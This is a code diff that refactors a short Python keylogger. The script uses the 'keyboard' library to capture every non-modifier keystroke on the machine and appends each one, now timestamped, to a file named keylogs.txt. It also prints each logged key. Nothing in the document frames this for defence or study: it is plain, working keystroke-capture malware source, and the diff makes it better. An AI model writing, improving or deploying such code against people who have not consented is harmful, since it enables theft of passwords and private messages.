@@ -1,23 +1,19 @@
-import keyboard
 import sys
 import time
+from datetime import datetime
+import keyboard
 
-LOG_FILE = 'keylogs.txt'
-
-def main():
+def log_keys():
     try:
-        while True:
-            event = keyboard.read_event()
-            
-            if event.name not in keyboard.all_modifiers:
-                with open(LOG_FILE, 'a') as f:
-                    f.write(event.name + '\n')
-                    
-            sys.stdout.flush()
-    except keyboard.KeyboardInterrupt:
-        pass
+        with open("keylogs.txt", "a") as f:
+            while True:
+                event = keyboard.read_event()
+                if event.name not in keyboard.all_modifiers:
+                    f.write(str(datetime.now()) + ": " + str(event.name) + "\n")
+                    print("Logged: ", event.name)
     except Exception as e:
-        print("Error occurred:", str(e))
+        print("Error occurred:", e, file=sys.stderr)
+        sys.exit(1)
 
 if __name__ == "__main__":
-    main()
+    log_keys()
